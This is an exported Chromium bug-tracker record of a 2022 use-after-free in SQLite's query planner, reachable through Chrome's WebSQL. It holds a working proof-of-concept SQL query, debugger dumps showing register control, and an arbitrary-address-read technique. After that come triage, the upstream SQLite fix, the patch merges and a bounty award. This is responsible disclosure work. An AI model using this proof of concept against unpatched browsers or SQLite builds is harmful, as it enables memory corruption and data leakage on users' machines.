# Security: UAF in WebSQL sqlite3Select, Potential RCE in Chrome

| Field | Value |
|-------|-------|
| **Issue ID** | [40060238](https://issues.chromium.org/issues/40060238) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Storage>WebSQL, Internals>Storage |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | et...@gmail.com |
| **Assignee** | ay...@chromium.org |
| **Created** | 2022-07-11 |
| **Bounty** | $10,000.00 |

## Description

**VULNERABILITY DETAILS**

## Vulnerability introduction and Vulnerability lifetime

This vulnerability was Introduced in a performance optimization in 2021.7  

->  

<https://sqlite.org/forum/forumpost/2d76f2bcf65d256a>  

Sometimes, the inner order by in select statement is unnecessary so that SQLite will ignore it when executing this kind of query, which causes a UAF vulnerability.

It affects all sqlite versions since 3.37.0.  

I was able to verify this vulnerability on Chrome stable, and considering this sqlite version has been out for almost a year, it may have been in Chrome for a long time, please fix it soon.

## Root Cause

[0] When the sqlite3Select function is processing the select statement, it will traverse the pEList, pOrderBy and pHaving node on the select statement, and save all the pointers of AGG\_FUNCTION and AGG\_COLUMN to pAggInfo.

[1] After that, the sqlite3Select function will continue to generate code for the pHaving node on the select statement, and if the pHaving node is also a select statement, it will recursively call the sqlite3Select function.

[2] For the reason of speed optimization, pOrderBy node on pHaving node may be released during processing.  

This optimization was introduced in: <https://sqlite.org/forum/forumpost/2d76f2bcf65d256a>

[3] However, the released pOrderBy node may be an AGG\_FUNCTION and its pointer was previously saved in pAggInfo.This pointer will be used in the subsequent resetAccumulator function, which causes a UAF vulnerability.

[0]

```
sqlite3ExprAnalyzeAggList(&sNC, pEList);  
sqlite3ExprAnalyzeAggList(&sNC, sSort.pOrderBy);  
if( pHaving ){  
  if( pGroupBy ){  
    assert( pWhere==p->pWhere );  
    assert( pHaving==p->pHaving );  
    assert( pGroupBy==p->pGroupBy );  
    havingToWhere(pParse, p);  
    pWhere = p->pWhere;  
  }  
  sqlite3ExprAnalyzeAggregates(&sNC, pHaving);  
}  

```

[1]

```
finalizeAggFunctions(pParse, pAggInfo);   
sqlite3ExprIfFalse(pParse, pHaving, addrOutputRow+1, SQLITE_JUMPIFNULL); //---->[1]  
selectInnerLoop(pParse, p, -1, &sSort,  
                &sDistinct, pDest,  
                addrOutputRow+1, addrSetAbort);  

```

[2]

```
if( pSub->pOrderBy!=0  
 && (p->pOrderBy!=0 || pTabList->nSrc>1)      /\* Condition (5) \*/  
 && pSub->pLimit==0                           /\* Condition (1) \*/  
 && (pSub->selFlags & SF_OrderByReqd)==0      /\* Condition (2) \*/  
 && (p->selFlags & SF_OrderByReqd)==0         /\* Condition (3) and (4) \*/  
 && OptimizationEnabled(db, SQLITE_OmitOrderBy)  
){  
  SELECTTRACE(0x100,pParse,p,  
            ("omit superfluous ORDER BY on %r FROM-clause subquery\n",i+1));  
  sqlite3ExprListDelete(db, pSub->pOrderBy); //---->[2]  
  pSub->pOrderBy = 0;  
}  

```

[3]

```
sqlite3VdbeResolveLabel(v, addrReset);  
resetAccumulator(pParse, pAggInfo); //---->[3]  
sqlite3VdbeAddOp2(v, OP_Integer, 0, iUseFlag);  
VdbeComment((v, "indicate accumulator empty"));  

```
```
static void resetAccumulator(Parse \*pParse, AggInfo \*pAggInfo) {  
    //......  
		for(pFunc=pAggInfo->aFunc, i=0; i<pAggInfo->nFunc; i++, pFunc++){  
		    if( pFunc->iDistinct>=0 ){  
			      Expr \*pE = pFunc->pFExpr;  
			      assert( ExprUseXList(pE) );  
			      if( pE->x.pList==0 || pE->x.pList->nExpr!=1 ){ //---->[3]  
			        sqlite3ErrorMsg(pParse, "DISTINCT aggregates must have exactly one "  
			           "argument");  
			        pFunc->iDistinct = -1;  
			      }else{  
			        KeyInfo \*pKeyInfo = sqlite3KeyInfoFromExprList(pParse, pE->x.pList,0,0);  
			        pFunc->iDistAddr = sqlite3VdbeAddOp4(v, OP_OpenEphemeral,  
			            pFunc->iDistinct, 0, 0, (char\*)pKeyInfo, P4_KEYINFO);  
			        ExplainQueryPlan((pParse, 0, "USE TEMP B-TREE FOR %s(DISTINCT)",  
			                          pFunc->pFunc->zName));  
			      }  
			    }  
			  }  
    //......  
}  

```
# potential exploitable

In order to better display the memory layout information, I use the SQLite compiled by myself with debugging information to show the subsequent exploitation.  

In Chrome, the poc may need to be adjusted slightly due to the slightly different compilation parameters

- build

```
mkdir workdir  
cd workdir  
git clone https://github.com/sqlite/sqlite  
// you also can checkout to 3.38.5 or 3.39.0  
mkdir build  
cd build  
../sqlite/configure  
make -j16  
./sqlite3 < poc.sql  

```

- poc

```
CREATE TABLE t0(c0);  
CREATE TABLE t1(c0);  
CREATE TABLE t2(c0);  
WITH t0 AS ( SELECT 1 GROUP BY 1 HAVING ( WITH t0 AS (  SELECT count(DISTINCT c0 IN t1) ORDER BY 1 ), t2 AS ( SELECT 1 FROM t1 WHERE X'4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141' IN t1 ) SELECT c0 FROM t0,  t2 ) ) DELETE FROM t0 WHERE 1 IN t0;  

```

- gdb result:

```
RAX  0x5555556c19a0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  
 RBX  0x5555556c41a0 —▸ 0x5555556c19a0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  
 RCX  0x55555566b604 ◂— 0x656400746e756f63 /\* 'count' \*/  
 RDX  0x5555556665b0 ◂— 'USE TEMP B-TREE FOR %s(DISTINCT)'  
 RDI  0x7fffffffbe30 —▸ 0x5555556a30a0 —▸ 0x55555569e8c0 (aVfs.18633) ◂— 0x7800000003  
 RSI  0x4141414141414141 ('AAAAAAAA') //-------------->!!!!!!!UAF here !!!!!!!  
 R8   0x5555556a30a0 —▸ 0x55555569e8c0 (aVfs.18633) ◂— 0x7800000003  
 R9   0x5555556c6440 ◂— 0x17f0100000001  
 R10  0x5555556a2010 ◂— 0x2000000000002  
 R11  0x7ffff7e19be0 (main_arena+96) —▸ 0x5555556c68c0 ◂— 0x0  
 R12  0x5555556c4110 ◂— 0xa00000000  
 R13  0x7fffffffbe30 —▸ 0x5555556a30a0 —▸ 0x55555569e8c0 (aVfs.18633) ◂— 0x7800000003  
 R14  0x555555666578 ◂— 'DISTINCT aggregates must have exactly one argument'  
 R15  0x5555556af950 —▸ 0x5555556a30a0 —▸ 0x55555569e8c0 (aVfs.18633) ◂— 0x7800000003  
 RBP  0x1  
 RSP  0x7fffffffa860 ◂— 0x7f0100000021 /\* '!' \*/  
 RIP  0x5555555c5f33 (resetAccumulator+131) ◂— cmp    dword ptr [rsi], 1  
────────────────────────────────────────[ DISASM ]────────────────────────────────────────  
 ► 0x5555555c5f33 <resetAccumulator+131>    cmp    dword ptr [rsi], 1  
   0x5555555c5f36 <resetAccumulator+134>    je     resetAccumulator+200                <resetAccumulator+200>  
    ↓  
   0x5555555c5f78 <resetAccumulator+200>    xor    ecx, ecx  
   0x5555555c5f7a <resetAccumulator+202>    xor    edx, edx  
   0x5555555c5f7c <resetAccumulator+204>    mov    rdi, r13  
   0x5555555c5f7f <resetAccumulator+207>    call   sqlite3KeyInfoFromExprList                <sqlite3KeyInfoFromExprList>  
   
   0x5555555c5f84 <resetAccumulator+212>    mov    edx, dword ptr [rbx + 0x14]  
   0x5555555c5f87 <resetAccumulator+215>    xor    r8d, r8d  
   0x5555555c5f8a <resetAccumulator+218>    xor    ecx, ecx  
   0x5555555c5f8c <resetAccumulator+220>    mov    rdi, r15  
   0x5555555c5f8f <resetAccumulator+223>    mov    esi, 0x76  

```

\*\*Note that the RSI register has been controlled by us to any value at this time.\*\*

And the heap:

```
pwndbg> p pE  
$2 = (Expr \*) 0x5555556c19a0  
pwndbg> x/14gx 0x5555556c1990  
0x5555556c1990:	0x0000000000000000	0x0000000000000061  
0x5555556c19a0:	0x4141414141414141	0x4141414141414141  
0x5555556c19b0:	0x4141414141414141	0x4141414141414141  
0x5555556c19c0:	0x4141414141414141	0x4141414141414141  
0x5555556c19d0:	0x4141414141414141	0x4141414141414141  
0x5555556c19e0:	0x4141414141414141	0x4141414141414141  
0x5555556c19f0:	0x0000000000000000	0x00000000000004c1  

```

So we can control the pE structure easily and through the calling sequence of sqlite3KeyInfoFromExprList-->sqlite3ExprNNCollSeq-->sqlite3ExprCollSeq-->sqlite3GetCollSeq, we can finally reach the sqlite3GetCollSeq function [0]:

```
SQLITE_PRIVATE CollSeq \*sqlite3GetCollSeq(  
  Parse \*pParse,        /\* Parsing context \*/  
  u8 enc,               /\* The desired encoding for the collating sequence \*/  
  CollSeq \*pColl,       /\* Collating sequence with native encoding, or NULL \*/  
  const char \*zName     /\* Collating sequence name \*/  
){  
  CollSeq \*p;  
  sqlite3 \*db = pParse->db;  
  
  p = pColl;  
  if( !p ){  
    p = sqlite3FindCollSeq(db, enc, zName, 0);  
  }  
  if( !p || !p->xCmp ){  
    /\* No collation sequence of this type for this encoding is registered.  
    \*\* Call the collation factory to see if it can supply us with one.  
    \*/  
    callCollNeeded(db, enc, zName);  
    p = sqlite3FindCollSeq(db, enc, zName, 0);  
  }  
  if( p && !p->xCmp && synthCollSeq(db, p) ){  
    p = 0;  
  }  
  assert( !p || p->xCmp );  
  if( p==0 ){  
    sqlite3ErrorMsg(pParse, "no such collation sequence: %s", zName);//------> [0]leak any address to error log  
    pParse->rc = SQLITE_ERROR_MISSING_COLLSEQ;  
  }  
  return p;  
}  

```

The zName here can be controlled to any value.  

However, at the end of this function, a call to the sqlite3ErrorMsg function can output what zName points to.

Therefore, this can cause a \*\*any address read\*\*.

\*\*Note: Since we have good control over the contents of this heap, there may be potential RCEs in other branches\*\*

**VERSION**  

Chrome Version: Chrome + [stable, beta, and dev]  

Operating System: All OS

**REPRODUCTION CASE**

## Reproduce

1. Download Chromium with asan from: <https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/linux-release%2Fasan-linux-release-1022628.zip?generation=1657534030067155&alt=media>
2. python3 -m http.server 8000
3. Run: `/path/to/asan-linux-release-1022628/chrome-wrapper --user-data-dir=./userdata http://127.0.0.1:8000/poc.html 2>&1 | /media/sakura/sakura_T7/chromium/src/tools/valgrind/asan/asan_symbolize.py`

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State: see asan log

**CREDIT INFORMATION**  

Reporter credit: Ziling Chen and Nan Wang(@eternalsakura13) of 360 Vulnerability Research Institute

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 977 B)
- [asan.txt](attachments/asan.txt) (text/plain, 24.6 KB)
- [poc.html](attachments/poc.html) (text/plain, 2.3 KB)
- [asan.log](attachments/asan.log) (text/plain, 18.5 KB)
- [poc.sql](attachments/poc.sql) (text/plain, 240 B)

## Timeline

### [Deleted User] (2022-07-11)

[Empty comment from Monorail migration]

### et...@gmail.com (2022-07-12)

It took me a while to adapt the poc of the exploitable section in the issue description to the current stable Chrome, the version number is Version 103.0.5060.114 (Official Build) (64-bit)
Please use this poc.html, and attach the debugger to the tab, then click trigger, you can see that the RSI has been modified to 0x4141414141414141
--->
Thread 14 "Database thread" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7fcb2b49d700 (LWP 65716)]
0x000055f714eba915 in ?? ()
(gdb) bt
#0  0x000055f714eba915 in  ()
#1  0x00002a0000af4640 in  ()
#2  0x00002a00009e70c0 in  ()
#3  0x0000008600000051 in  ()
#4  0x00002a0000af4640 in  ()
#5  0x00002a0000cf1680 in  ()
#6  0x00000000fffffffd in  ()
#7  0x0000000000000000 in  ()
(gdb) info r
rax            0x2a0000c9f7f0      46179501602800
rbx            0x2a0000cf95c0      46179501970880
rcx            0xfffffff7          4294967287
rdx            0x2a00009e70c0      46179498750144
rsi            0x4141414141414141  4702111234474983745 //------------------> rsi corrupt
rdi            0x2a0000360c91      46179491908753
rbp            0x7fcb2b49a930      0x7fcb2b49a930
rsp            0x7fcb2b49a8f0      0x7fcb2b49a8f0
r8             0x0                 0
r9             0x2a0000360000      46179491905536
r10            0x0                 0
r11            0x1                 1
r12            0x2a0000cfa8f8      46179501975800
r13            0x1                 1
r14            0x7fcb2b49c008      140510581342216
r15            0x2a0000af4640      46179499853376
rip            0x55f714eba915      0x55f714eba915
eflags         0x10206             [ PF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0


### cl...@chromium.org (2022-07-12)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5870772287635456.

### et...@gmail.com (2022-07-13)

Is anyone working on a fix for this bug?


### cl...@chromium.org (2022-07-13)

ClusterFuzz testcase 5870772287635456 is closed as invalid, so closing issue.

### ct...@chromium.org (2022-07-13)

Resetting this to Unconfirmed so this goes back into the security triage queue. Looks like Clusterfuzz ran into unexpected issues.

### et...@gmail.com (2022-07-13)

re https://crbug.com/chromium/1343348#c6:thanks, can you reproduce manually and assign it?

### et...@gmail.com (2022-07-13)

re https://crbug.com/chromium/1343348#c6:
This doesn't require a complicated environment, you can use https://crbug.com/chromium/1343348#c2 's poc to reproduce it on stable linux chrome


### cl...@chromium.org (2022-07-13)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5674863209676800.

### et...@gmail.com (2022-07-13)

This is a serious security bug(render UAF) that has existed in stable chrome for a long time, and can control some registers and memory layout stably.
I have verified that under certain conditions, it can achieve arbitrary address reads, maybe we should fix it soon.

### et...@gmail.com (2022-07-13)

[Comment Deleted]

### ct...@chromium.org (2022-07-13)

Fortunately, it looks like the view restrictions on this bug never changed (and if I recall correctly, WontFix'd bugs go through the same SecurityNotify period as fixed bugs do). Sorry for the unexpected WontFix'ing by the clusterfuzz bot -- hopefully we can improve that in the future.

### et...@gmail.com (2022-07-13)

[Comment Deleted]

### et...@gmail.com (2022-07-13)

[Comment Deleted]

### et...@gmail.com (2022-07-13)

[Comment Deleted]

### aj...@google.com (2022-07-13)

(hopefully preventing further CF meddling)

### dc...@chromium.org (2022-07-13)

Because the person doing security bug triage is currently overwhelmed triaging a bunch of reports that require a lot of additional manual work :)

We should and will fix this. As you mentioned, this is a straightforward PoC, which means it should be  something Clusterfuzz should be able to easily handle (especially for things like figuring out the regression range, which is important for merges). I don't really know why Clusterfuzz is having so much issue, but hopefully this next attempt actually works.

### dc...@chromium.org (2022-07-13)

> I don't want to go through won't fix again, it was a bad experience.

This was surprising as well, but please understand that this is the result of automation running wild.

### aj...@google.com (2022-07-13)

repros on Windows HEAD

### et...@gmail.com (2022-07-13)

Thanks for your reply, maybe it's because the button is used in my second poc, and clicking the button can trigger the vulnerability.
I'm not sure clusterfuzz is using the second poc in https://crbug.com/chromium/1343348#c2

### aj...@google.com (2022-07-13)

CC third_party sqlite owners

[Monorail components: Internals>Storage]

### dc...@chromium.org (2022-07-13)

Clusterfuzz has the first PoC, which doesn't require additional interactions.

### et...@gmail.com (2022-07-13)

Thanks for your help, can you help me manually assign this vulnerability.
I will understand the inadequacies in automated testing and thank you for remedies!

### ay...@chromium.org (2022-07-14)

Looks like first milestone including versions on/after 3.37.1 is M99.
https://chromiumdash.appspot.com/commit/c6370f0bb183598c6eb5bf33a2f108fcbda56ff5



### ay...@chromium.org (2022-07-14)

+ Dr. Hipp and Daniel (sqlite authors) Can you help take a look?

### cl...@chromium.org (2022-07-14)

ClusterFuzz testcase 5674863209676800 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2022-07-14)

Detailed Report: https://clusterfuzz.com/testcase?key=5674863209676800

Fuzzer: None
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: 
Crash Address: 
Crash State:
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&revision=1023968

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5674863209676800

Additional requirements: Requires HTTP

To reproduce this, please build the target in this report and run it against the reproducer testcase. Please use the GN arguments provided at bottom of this report when building the binary. 

If you have trouble reproducing, please also export the environment variables listed under "[Environment]" in the crash stacktrace.

If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### dc...@chromium.org (2022-07-14)

ayui@, I'm going to assign to you for tracking purposes in Chrome.

Clusterfuzz still can't repro for some reason.

[Monorail components: Blink>Storage>WebSQL]

### dc...@chromium.org (2022-07-14)

[Empty comment from Monorail migration]

### dc...@chromium.org (2022-07-14)

[Empty comment from Monorail migration]

### [Deleted User] (2022-07-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2022-07-14)

ClusterFuzz testcase 5674863209676800 appears to be flaky, updating reproducibility label.

### et...@gmail.com (2022-07-14)

hi, Dr. Hipp and Daniel.
I uploaded the simplest poc that is easy to reproduce in sqlite, I hope it can help you fix it :)

### dr...@gmail.com (2022-07-14)

The problem is now fixed on the SQLite trunk and on branch-3.39.  See https://sqlite.org/src/info/b88d6c4b814ec416 for the simple and well-localized patch.

Unfortunately, we were notified of this problem only hours after we pushed out the 3.39.1 patch release of SQLite.  So this fix is not in 3.39.1.  We can turn around and do version 3.39.2 tomorrow if you need it.  But maybe you can just take the patch?

I did not include a POC in the public test suite for SQLite.  But test cases are in two of the private test suites we maintain for SQLite, so we are protected against a regression.  The POC is now also a fuzzer seed.

### as...@chromium.org (2022-07-14)

I should be able to just cherry-pick the patch in. Thank you for the prompt fix!

### [Deleted User] (2022-07-14)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dr...@gmail.com (2022-07-14)

Instead of cherry-picking, you could, if you want, just pick up check-in b88d6c4b814ec416, which is the latest patch release (3.39.1) plus the UAF fix and nothing else.  In Fossil, that check-in is:

https://sqlite.org/src/timeline?r=branch-3.39&m=b88d6c4b814ec416
https://sqlite.org/src/info/b88d6c4b814ec416

The first link above (the /timeline link) clearly shows the relationship between the 3.39.1 release and the check-in I have in mind.

The GitHub mirror for thae check-in I am referring to is:  https://github.com/sqlite/sqlite/tree/9dde91f61386e4fc53eb95b6cbd26bf30521225f




### gi...@appspot.gserviceaccount.com (2022-07-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/sqlite/+/88f6139eadb183a025efeba5fc483bb6f6416eb2

commit 88f6139eadb183a025efeba5fc483bb6f6416eb2
Author: Ayu Ishii <ayui@chromium.org>
Date: Fri Jul 15 13:20:47 2022

When applying the omit-ORDER-BY optimization, defer deleting the AST of
the deleted ORDER BY clause until after code generation ends.


FossilOrigin-Name: b88d6c4b814ec4166ec50f32a2f10d7857df05414c0048c1234ab290a273e50c
(cherry picked from commit 9dde91f61386e4fc53eb95b6cbd26bf30521225f)
Bug: 1343348
Change-Id: Id677f72166c00a05f95c25438230f4b1d40f4d4d
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/sqlite/+/3764026
Reviewed-by: Austin Sullivan <asully@chromium.org>
Commit-Queue: Ayu Ishii <ayui@chromium.org>
Reviewed-by: Joshua Bell <jsbell@chromium.org>

[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/amalgamation_dev/sqlite3.c
[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/amalgamation/sqlite3.c
[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/manifest
[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/amalgamation/sqlite3.h
[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/manifest.uuid
[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/src/select.c
[modify] https://crrev.com/88f6139eadb183a025efeba5fc483bb6f6416eb2/amalgamation_dev/sqlite3.h


### gi...@appspot.gserviceaccount.com (2022-07-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/b83057c957a875138d0bee7e7545f5923750bca2

commit b83057c957a875138d0bee7e7545f5923750bca2
Author: Austin Sullivan <asully@chromium.org>
Date: Fri Jul 15 16:54:45 2022

SQLite: Cherry-pick post-3.39.1

Roll src/third_party/sqlite/src/ 98bd61ec6..88f6139ea (1 commit)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/98bd61ec66ad..88f6139eadb1

$ git log 98bd61ec6..88f6139ea --date=short --no-merges --format='%ad %ae %s'
2022-07-15 ayui When applying the omit-ORDER-BY optimization, defer deleting the AST of the deleted ORDER BY clause until after code generation ends.

Created with:
  roll-dep src/third_party/sqlite/src

Fixed: 1343348
Change-Id: Icba3e0a7038d3008998a209f82b438356c988b12
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3765898
Commit-Queue: Austin Sullivan <asully@chromium.org>
Commit-Queue: Ayu Ishii <ayui@chromium.org>
Reviewed-by: Ayu Ishii <ayui@chromium.org>
Auto-Submit: Austin Sullivan <asully@chromium.org>
Cr-Commit-Position: refs/heads/main@{#1024792}

[modify] https://crrev.com/b83057c957a875138d0bee7e7545f5923750bca2/DEPS


### [Deleted User] (2022-07-15)

LTS Milestone M102

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:
1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-07-15)

[Empty comment from Monorail migration]

### as...@chromium.org (2022-07-15)

1. Was this issue a regression for the milestone it was found in?

No. According to the OP, this issue was introduced in https://sqlite.org/forum/forumpost/2d76f2bcf65d256a which became available in SQLite version 3.37.0, which I believe would have been rolled into Chromium in https://crrev.com/c/3366601, which landed in M99.

2. Is this issue related to a change or feature merged after the latest LTS Milestone?

Yes, I believe the bad change was landed in M99

### [Deleted User] (2022-07-16)

[Empty comment from Monorail migration]

### rz...@google.com (2022-07-20)

Most of the changed code isn't present in M96 - it uses origin/chromium-version-3.36.0 branch, and the fix isn't applicable if we create a new branch for M96 based in this revision and the delta is too big to change M96 revision to chromium-version-3.39.1-good.

### et...@gmail.com (2022-07-20)

re https://crbug.com/chromium/1343348#c28:
hi, @dcheng, @ayui, @asully
My fuzz found a new UAF in WebSQL.
I analyzed its root cause and provided a temporary patch.
To my surprise, another vulnerability may have existed in Chrome for 7 years, and I can confirm that it was introduced in sqlite 3.9.0 in 2015.
So it is not a patch bypass for this vulnerability.

Since all the websql vulnerabilities I submitted cannot be reproduced on clusterfuzz, I have provided a reproduce video for your reference and hope to get the assign as soon as possible, so that it gets fixed asap.
thanks :)
Its exploit is similar to this vulnerability, please fix it as soon as possible.
Issue link is here:
https://bugs.chromium.org/p/chromium/issues/detail?id=1345947




### am...@google.com (2022-07-21)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-07-21)

Congratulations, Ziling Chen and Nan Wang! The VRP Panel has decided to award you $10,000 for this report. We appreciate the efforts in providing analysis and an updated, minimized POC prior to the fix to help us get this issue to be reproducible and addressed faster. Thank you for your efforts and reporting this issue to us! Nice work! 

### am...@google.com (2022-07-22)

[Empty comment from Monorail migration]

### rz...@google.com (2022-08-11)

[Empty comment from Monorail migration]

### rz...@google.com (2022-08-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-11)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2022-08-11)

1. https://crrev.com/c/3827342 and one CL for rolling the dep when this gets merged
2. Low, no conflicts
3. Merged to branch chromium-version-3.39.1-good on Jul 15, still need to check which chromium release is this
4. Yes

### gm...@google.com (2022-08-11)

I see this merged to 104. Approving for LTC-102.

### gi...@appspot.gserviceaccount.com (2022-08-16)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/deps/sqlite/+/9328fbe3d1e09dd7290d55e993aa85256e055d9c

commit 9328fbe3d1e09dd7290d55e993aa85256e055d9c
Author: drh <>
Date: Tue Aug 16 19:43:01 2022

[M102-LTS] When applying the omit-ORDER-BY optimization, defer deleting the AST of
the deleted ORDER BY clause until after code generation ends.

Bug: 1343348
No-Try: true
No-Presubmit: true
No-Tree-Checks: true
FossilOrigin-Name: b88d6c4b814ec4166ec50f32a2f10d7857df05414c0048c1234ab290a273e50c
(cherry picked from commit 9dde91f61386e4fc53eb95b6cbd26bf30521225f)
Change-Id: I40a3f3f10838075f90253c233445803b1f4e67e0
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/deps/sqlite/+/3827342
Reviewed-by: Michael Ershov <miersh@google.com>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Commit-Queue: Michael Ershov <miersh@google.com>

[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/amalgamation_dev/sqlite3.c
[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/amalgamation/sqlite3.c
[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/manifest
[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/amalgamation/sqlite3.h
[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/manifest.uuid
[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/src/select.c
[modify] https://crrev.com/9328fbe3d1e09dd7290d55e993aa85256e055d9c/amalgamation_dev/sqlite3.h


### gi...@appspot.gserviceaccount.com (2022-08-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2fefec5609504aad7a669454a118d8624a45f57e

commit 2fefec5609504aad7a669454a118d8624a45f57e
Author: Roger Zanoni <rzanoni@google.com>
Date: Wed Aug 17 09:35:11 2022

[M102-LTS] Roll src/third_party/sqlite/src/ a54d5d154..9328fbe3d (1 commit)

https://chromium.googlesource.com/chromium/deps/sqlite.git/+log/a54d5d154f4b..9328fbe3d1e0

$ git log a54d5d154..9328fbe3d --date=short --no-merges --format='%ad %ae %s'
2022-08-16  [M102-LTS] When applying the omit-ORDER-BY optimization, defer deleting the AST of the deleted ORDER BY clause until after code generation ends.

Created with:
  roll-dep src/third_party/sqlite/src

Bug: 1343348
Change-Id: I14de8f25006d334a1f0cf3488e9193e70e2610e5
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3833542
Reviewed-by: Michael Ershov <miersh@google.com>
Owners-Override: Michael Ershov <miersh@google.com>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Cr-Commit-Position: refs/branch-heads/5005@{#1308}
Cr-Branched-From: 5b4d9450fee01f821b6400e947b3839727643a71-refs/heads/main@{#992738}

[modify] https://crrev.com/2fefec5609504aad7a669454a118d8624a45f57e/DEPS


### rz...@google.com (2022-08-17)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-08-29)

[Empty comment from Monorail migration]

### am...@google.com (2022-08-30)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### [Deleted User] (2022-10-21)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1343348?no_tracker_redirect=1

[Multiple monorail components: Blink>Storage>WebSQL, Internals>Storage]
[Monorail components added to Component Tags custom field.]

### ti...@chromium.org (2024-06-27)

Adding `ClusterFuzz-Ignore` hotlist to all `ClusterFuzz-Wrong` issues per crbug.com/40285975.

### ti...@chromium.org (2024-06-27)

Adding `ClusterFuzz-Ignore` hotlist to all `ClusterFuzz-Wrong` issues per crbug.com/40285975.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40060238)*
